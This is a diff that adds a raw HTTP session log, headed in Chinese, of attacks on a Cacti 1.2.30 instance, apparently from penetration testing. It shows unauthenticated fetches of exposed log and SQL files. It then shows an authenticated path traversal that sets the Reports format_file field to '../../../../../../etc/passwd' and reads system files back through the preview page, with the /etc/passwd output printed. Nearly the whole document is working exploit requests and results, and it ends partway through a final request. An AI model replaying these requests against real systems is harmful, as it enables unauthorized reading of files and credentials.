@@ -1,0 +1,148 @@
+====================================================================================================
+原始 HTTP 会话转录 —— Cacti 1.2.30 @ 192.168.188.x/cacti    时间: 2026-09-18 10:01:04
+====================================================================================================
+
+########## A) 未认证（零凭据、无 Cookie）##########
+
+>>> GET /cacti/log/cacti.log HTTP/1.1
+    Host: 192.168.188.x
+<<< HTTP/1.1 200
+    Content-Length: 44520501
+    [未认证]
+    body: '04/24/2026 11:24:04 - ERROR PHP WARNING: Undefined array key "localhost:3306:cac'
+
+>>> GET /cacti/cacti.sql HTTP/1.1
+    Host: 192.168.188.x
+<<< HTTP/1.1 200
+    Content-Type: application/sql
+    Content-Length: 127216
+    [未认证]
+    body: '/*\n  +-------------------------------------------------------------------------+'
+
+>>> GET /cacti/log/ HTTP/1.1
+    Host: 192.168.188.x
+<<< HTTP/1.1 302
+    Content-Type: text/html; charset=UTF-8
+    Content-Length: 0
+    Location: ../index.php
+    [未认证]
+    body: ''
+
+>>> GET /cacti/log/.htaccess HTTP/1.1
+    Host: 192.168.188.x
+<<< HTTP/1.1 403
+    Content-Type: text/html; charset=iso-8859-1
+    Content-Length: 280
+    [未认证]
+    body: '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>403 Forbi'
+
+>>> GET /cacti/include/config.php HTTP/1.1
+    Host: 192.168.188.x
+<<< HTTP/1.1 200
+    Content-Type: text/html; charset=UTF-8
+    Content-Length: 0
+    [未认证]
+    body: ''
+
+########## B) 需认证（Reports format_file 路径穿越）##########
+
+>>> GET /cacti/index.php HTTP/1.1
+    Host: 192.168.188.x
+<<< HTTP/1.1 200
+    Content-Type: text/html; charset=UTF-8
+    Set-Cookie: Cacti=09af6nkuook9bl5n413acopt2j; path=/cacti/; HttpOnly; SameSite=Strict
+    [取 __csrf_magic]
+
+>>> POST /cacti/index.php HTTP/1.1
+    Host: 192.168.188.x
+    body: {'__csrf_magic': '<110 bytes>', 'action': 'login', 'login_username': 'admin', 'login_password': '***'}
+<<< HTTP/1.1 302
+    Content-Type: text/html; charset=UTF-8
+    Content-Length: 0
+    Location: /cacti/index.php
+    [登录（口令已脱敏）]
+
+>>> GET /cacti/reports_admin.php?action=edit&tab=details&id=6
+<<< HTTP 200   原始 format_file = 'default.format'   email = 'root@localhost'   cformat = True
+
+>>> GET /cacti/reports_admin.php?action=edit&tab=preview&id=6 HTTP/1.1
+    Host: 192.168.188.x
+<<< HTTP/1.1 200
+    Content-Type: text/html; charset=UTF-8
+    body: <style type='text/css'>
+
+body {
+margin-left:auto;
+margin-right:auto;
+}
+
+table {
+border-collapse: collapse;
+border-spacing: 0;
+border: none;
+text-align: center;
+align-content: center;
+width: 100%;
+}
+
+.report_table {
+background-color:#F9F9F9;
+text-align: center;
+
+>>> POST /cacti/reports_admin.php HTTP/1.1
+    Host: 192.168.188.x
+    body: {'__csrf_magic': 'sid:e696a9a43b94fb58078a9f49d82544d226be66e1,1789696863', 'action': 'save', 'save_component_report': '1', 'id': '6', 'name': 'idor_real_1779807800', 'subject': 'Cacti Report', 'email': 'root@localhost', 'bcc': '', 'from_name': 'Cacti', 'from_email': 'cacti@localhost', 'font_size': '10', 'alignment': '1', 'graph_columns': '1', 'graph_width': '600', 'graph_height': '200', 'intrvl': '2', 'count': '1', 'mailtime': '2026-09-19 06:45', 'attachment_type': '2', 'format_file': '<28 bytes>', 'enabled': 'on', 'cformat': 'on', 'graph_linked': 'on', 'thumbnails': 'on'}
+<<< HTTP/1.1 302
+    Content-Type: text/html; charset=UTF-8
+    Content-Length: 0
+    Location: reports_admin.php?action=edit&header=false&id=6
+    [写 format_file = {'__csrf_magic': 'sid:e696a9a43b94fb58078a9f49d82544d226be66e1,1789696863', 'name': 'idor_real_1779807800', 'enabled': '', 'enabled__c': True, 'cformat': '', 'cformat__c': True, 'graph_linked': '', 'graph_linked__c': True, 'thumbnails': '', 'thumbnails__c': True, 'mailtime': '2026-09-19 06:45', 'count': '1', 'subject': 'Cacti Report', 'from_name': 'Cacti', 'from_email': 'cacti@localhost', 'id': '6', 'save_component_report': '1', 'action': 'save', 'format_file': 'default.format', 'font_size': '10', 'alignment': '1', 'graph_columns': '1', 'graph_width': '600', 'graph_height': '200', 'intrvl': '2', 'attachment_type': '2', 'email': 'root@localhost', 'bcc': ''}]
+
+>>> POST /cacti/reports_admin.php HTTP/1.1
+    Host: 192.168.188.x
+    body: {'__csrf_magic': 'sid:e696a9a43b94fb58078a9f49d82544d226be66e1,1789696863', 'action': 'save', 'save_component_report': '1', 'id': '6', 'name': 'idor_real_1779807800', 'subject': 'Cacti Report', 'email': 'root@localhost', 'bcc': '', 'from_name': 'Cacti', 'from_email': 'cacti@localhost', 'font_size': '10', 'alignment': '1', 'graph_columns': '1', 'graph_width': '600', 'graph_height': '200', 'intrvl': '2', 'count': '1', 'mailtime': '2026-09-19 06:45', 'attachment_type': '2', 'format_file': '../../../../../../etc/hostname', 'enabled': 'on', 'cformat': 'on', 'graph_linked': 'on', 'thumbnails': 'on'}
+<<< HTTP/1.1 302
+    Content-Type: text/html; charset=UTF-8
+    Content-Length: 0
+    Location: reports_admin.php?action=edit&header=false&id=6
+    [写 format_file = '../../../../../../etc/hostname']
+
+>>> GET /cacti/reports_admin.php?action=edit&tab=preview&id=6 HTTP/1.1
+    Host: 192.168.188.x
+<<< HTTP/1.1 200
+    Content-Type: text/html; charset=UTF-8
+    body: 【etc/hostname】ubuntu
+
+>>> POST /cacti/reports_admin.php HTTP/1.1
+    Host: 192.168.188.x
+    body: {'__csrf_magic': 'sid:e696a9a43b94fb58078a9f49d82544d226be66e1,1789696863', 'action': 'save', 'save_component_report': '1', 'id': '6', 'name': 'idor_real_1779807800', 'subject': 'Cacti Report', 'email': 'root@localhost', 'bcc': '', 'from_name': 'Cacti', 'from_email': 'cacti@localhost', 'font_size': '10', 'alignment': '1', 'graph_columns': '1', 'graph_width': '600', 'graph_height': '200', 'intrvl': '2', 'count': '1', 'mailtime': '2026-09-19 06:45', 'attachment_type': '2', 'format_file': '<28 bytes>', 'enabled': 'on', 'cformat': 'on', 'graph_linked': 'on', 'thumbnails': 'on'}
+<<< HTTP/1.1 302
+    Content-Type: text/html; charset=UTF-8
+    Content-Length: 0
+    Location: reports_admin.php?action=edit&header=false&id=6
+    [写 format_file = {'__csrf_magic': 'sid:e696a9a43b94fb58078a9f49d82544d226be66e1,1789696863', 'name': 'idor_real_1779807800', 'enabled': '', 'enabled__c': True, 'cformat': '', 'cformat__c': True, 'graph_linked': '', 'graph_linked__c': True, 'thumbnails': '', 'thumbnails__c': True, 'mailtime': '2026-09-19 06:45', 'count': '1', 'subject': 'Cacti Report', 'from_name': 'Cacti', 'from_email': 'cacti@localhost', 'id': '6', 'save_component_report': '1', 'action': 'save', 'format_file': 'default.format', 'font_size': '10', 'alignment': '1', 'graph_columns': '1', 'graph_width': '600', 'graph_height': '200', 'intrvl': '2', 'attachment_type': '2', 'email': 'root@localhost', 'bcc': ''}]
+
+>>> POST /cacti/reports_admin.php HTTP/1.1
+    Host: 192.168.188.x
+    body: {'__csrf_magic': 'sid:e696a9a43b94fb58078a9f49d82544d226be66e1,1789696863', 'action': 'save', 'save_component_report': '1', 'id': '6', 'name': 'idor_real_1779807800', 'subject': 'Cacti Report', 'email': 'root@localhost', 'bcc': '', 'from_name': 'Cacti', 'from_email': 'cacti@localhost', 'font_size': '10', 'alignment': '1', 'graph_columns': '1', 'graph_width': '600', 'graph_height': '200', 'intrvl': '2', 'count': '1', 'mailtime': '2026-09-19 06:45', 'attachment_type': '2', 'format_file': '../../../../../../etc/passwd', 'enabled': 'on', 'cformat': 'on', 'graph_linked': 'on', 'thumbnails': 'on'}
+<<< HTTP/1.1 302
+    Content-Type: text/html; charset=UTF-8
+    Content-Length: 0
+    Location: reports_admin.php?action=edit&header=false&id=6
+    [写 format_file = '../../../../../../etc/passwd']
+
+>>> GET /cacti/reports_admin.php?action=edit&tab=preview&id=6 HTTP/1.1
+    Host: 192.168.188.x
+<<< HTTP/1.1 200
+    Content-Type: text/html; charset=UTF-8
+    body: 【etc/passwd】root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cac
+
+>>> POST /cacti/reports_admin.php HTTP/1.1
+    Host: 192.168.188.x
+    body: {'__csrf_magic': 'sid:e696a9a43b94fb58078a9f49d82544d226be66e1,1789696863', 'action': 'save', 'save_component_report': '1', 'id': '6', 'name': 'idor_real_1779807800', 'subject': 'Cacti Report', 'email': 'root@localhost', 'bcc': '', 'from_name': 'Cacti', 'from_email': 'cacti@localhost', 'font_size': '10', 'alignment': '1', 'graph_columns': '1', 'graph_width': '600', 'graph_height': '200', 'intrvl': '2', 'count': '1', 'mailtime': '2026-09-19 06:45', 'attachment_type': '2', 'format_file': '<28 bytes>', 'enabled': 'on', 'cformat': 'on', 'graph_linked': 'on', 'thumbnails': 'on'}
